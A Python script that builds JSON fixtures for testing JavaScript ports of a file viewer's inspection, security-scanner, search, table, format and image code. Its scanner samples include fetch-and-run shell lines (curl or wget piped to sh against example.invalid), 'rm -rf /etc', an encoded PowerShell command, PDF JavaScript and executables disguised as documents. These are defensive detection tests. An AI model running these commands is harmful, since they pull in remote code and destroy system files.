"""Write tests/fixtures/web_engines.json: inputs + outputs of TextView's Python code for the JS ports in src/web/static.

    inspect / scan  <- file_inspector.inspect_file, looks_binary, security_scanner.scan_file
    bm25            <- workspace_index.tokenize + BM25Index on the first demo chunks
    table           <- table_data numeric_stats / string_stats / detect_numeric_columns
    formats         <- file_loader.detect_format, format_db FormatDB.search (bundled entries only)
    image           <- image_adjust.adjust on a small synthetic RGBA image

The *.test.mjs files check the JS against this; tests/test_web.py checks it is still what Python produces.
Run: python scripts/make_web_fixtures.py
"""
import io
import json
import sys
import tempfile
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
OUT = ROOT / "tests" / "fixtures" / "web_engines.json"


def _zip(members: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n, data in members.items():
            z.writestr(zipfile.ZipInfo(n, (2026, 1, 1, 0, 0, 0)), data)
    return buf.getvalue()


INSPECT_CASES = {
    "photo.png": (ROOT / "sample_files" / "example.png").read_bytes()[:600],
    "report.pdf": b"%PDF-1.4\n1 0 obj << /OpenAction 2 0 R /JS (app.alert(1)) >>\nendobj\n",
    "macro.docm": _zip({"word/document.xml": b"<w/>", "word/vbaProject.bin": b"\x00\x01"}),
    "links.xlsx": _zip({"xl/workbook.xml": b"<w/>", "xl/externalLinks/externalLink1.xml": b"<l/>"}),
    "invoice.pdf": b"\x7fELF\x02\x01\x01" + bytes(40),
    "fat.pdf": b"\xcf\xfa\xed\xfe\x07\x00\x00\x01" + bytes(24),
    "universal.doc": b"\xca\xfe\xba\xbe\x00\x00\x00\x02" + bytes(24),
    "libx.dylib": b"\xcf\xfa\xed\xfe\x07\x00\x00\x01" + bytes(24),
    "install.sh": b"#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | bash\nrm -rf /etc\n",
    "run.ps1": b"powershell.exe -enc SQBFAFgA\n",
    "notes.txt": b"plain ascii notes\nline two\n",
    "steps.txt": b"then run: wget -qO- https://example.invalid/x | sh\n",
    "install": b"#!/bin/sh\neval $(curl -s https://example.invalid/env)\n",
    "readme.md": "café — résumé notes\n".encode("utf-8"),
    "page.html": b"<!DOCTYPE html><html><script>alert(1)</script><a href='javascript:x()'>x</a></html>",
    "icon.svg": b"<?xml version='1.0'?><svg><script>1</script></svg>",
    "setup.exe": b"MZ\x90\x00" + bytes(60),
    "model.pkl": b"\x80\x04\x95" + bytes(20),
    "data.gz": b"\x1f\x8b\x08\x00" + bytes(16),
    "blob.bin": bytes(range(256)) * 2,
    "store.db": b"SQLite format 3\x00" + bytes(84),
    "arr.npz": _zip({"a.npy": b"\x93NUMPY"}),
    "empty.dat": b"",
    "report.dat": b"%PDF-1.4\n%\xe2\xe3\n",
    "photo.bin": b"\x89PNG\r\n\x1a\n" + bytes(20),
    "climate.nc": b"\x89HDF\r\n\x1a\n" + bytes(20),
    "hex.py": b"x = '" + b"\\x41" * 35 + b"'\nimport os\n",
}

TABLE_COLUMNS = [
    ["92.5", "85.0", "98.2", "77.3", "89.9", "82.6"],
    ["30", "25", "42", "35", "28", "31", ""],
    ["1,200", "3_400", "12%", "-7", "0.5"],
    ["1", "2"], ["5", "5", "5", "5"], ["12.125", "12.125"],
    ["Boston", "Seattle", "Boston", "", "Austin"], ["", ""],
    ["0.0001", "0.00012", "0.00009", "0.0002", "1e-5"],
]
DETECT_NAMES = ["a.py", "README.MD", "Dockerfile", "x.tar.gz", "data.CSV", "photo.JPG", "noext", "mix.S", "mix.s",
                "package-lock.json", "song.flac", "deck.unknownext", ".gitignore", "notes.txt", "book.epub"]
FORMAT_QUERIES = ["csv", "json", "pdf", "image", "zip", "data", ".npy", "sql", "font", "xyzzy", "py", "e"]
BM25_QUERIES = ["citation locator", "pdf page", "markdown rendering table", "agent tools safety", "notebook cell",
                "the", "plugin hook register", "zzzz"]
IMAGE_PARAMS = [{"brightness": 1.3}, {"contrast": 1.6}, {"contrast": 0.5}, {"saturation": 0.2},
                {"saturation": 2.0}, {"gamma": 1.8}, {"brightness": 0.7, "contrast": 1.2, "saturation": 1.5, "gamma": 0.8},
                {"autoscale": True}, {"autoscale": True, "contrast": 1.4}]


def inspect_cases():
    from src.file_inspector import inspect_file, looks_binary
    from src.security_scanner import scan_file
    out = []
    with tempfile.TemporaryDirectory() as tmp:
        for name, data in INSPECT_CASES.items():
            p = Path(tmp) / name
            p.write_bytes(data)
            info = inspect_file(p).to_dict()
            for k in ("path", "mtime_iso"):
                info.pop(k)
            sr = scan_file(p)
            findings = [{"severity": f.severity, "category": f.category, "description": f.description,
                         "detail": f.detail} for f in sr.findings if f.category != "macos_quarantine"]
            out.append({"name": name, "hex": data.hex(), "info": info, "binary": looks_binary(data[:4096]),
                        "findings": findings})
    return out


def bm25_cases():
    from src.web.search import demo_index
    from src.workspace_index import BM25Index, tokenize
    chunks = [c.text for c in demo_index()[0][:40]]
    bm = BM25Index()
    for t in chunks:
        bm.add(tokenize(t))
    bm.finalize()
    return {"chunks": chunks, "queries": [{"q": q, "tokens": tokenize(q), "hits": [[s, i] for s, i in
                                                                                    bm.search(tokenize(q), k=10)]}
                                          for q in BM25_QUERIES]}


def table_cases():
    from src.table_data import detect_numeric_columns, numeric_stats, string_stats, to_number
    cols = []
    for vals in TABLE_COLUMNS:
        nums = [n for n in (to_number(v) for v in vals) if n is not None]
        cols.append({"values": vals, "numbers": nums, "numeric": numeric_stats(nums), "string": string_stats(vals)})
    header = ["name", "age", "city", "score"]
    rows = [r.split(",") for r in (ROOT / "sample_files" / "example.csv").read_text().splitlines()[1:]]
    return {"columns": cols, "header": header, "rows": rows, "detect": detect_numeric_columns(header, rows)}


def format_cases():
    from src.file_loader import FILENAME_MAP, FORMAT_MAP, detect_format
    from src.web.catalog import bundled_entries
    entries = bundled_entries()
    return {"format_map": FORMAT_MAP, "filename_map": FILENAME_MAP, "detect": {n: detect_format(n) for n in DETECT_NAMES},
            "search": {q: [e.id for e in _search(entries, q)] for q in FORMAT_QUERIES}}


def _search(entries, q):
    from src.format_db import FormatDB
    db = FormatDB.__new__(FormatDB)
    db.entries = entries
    return db.search(q)


def image_cases():
    from PIL import Image
    from src.image_adjust import adjust
    w, h = 12, 9
    px = bytearray()
    for y in range(h):
        for x in range(w):
            px += bytes([(x * 21 + y * 3) % 256, (y * 27 + 40) % 256, (x * y * 7 + 90) % 256, 255])
    img = Image.frombytes("RGBA", (w, h), bytes(px))
    return {"width": w, "height": h, "pixels": list(px),
            "cases": [{"params": prm, "out": list(adjust(img, **prm).convert("RGBA").tobytes())} for prm in IMAGE_PARAMS]}


def build() -> dict:
    return {"inspect": inspect_cases(), "bm25": bm25_cases(), "table": table_cases(), "formats": format_cases(),
            "image": image_cases()}


if __name__ == "__main__":
    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(json.dumps(build(), indent=1, ensure_ascii=False))
    print(f"wrote {OUT.relative_to(ROOT)} ({OUT.stat().st_size} bytes)")
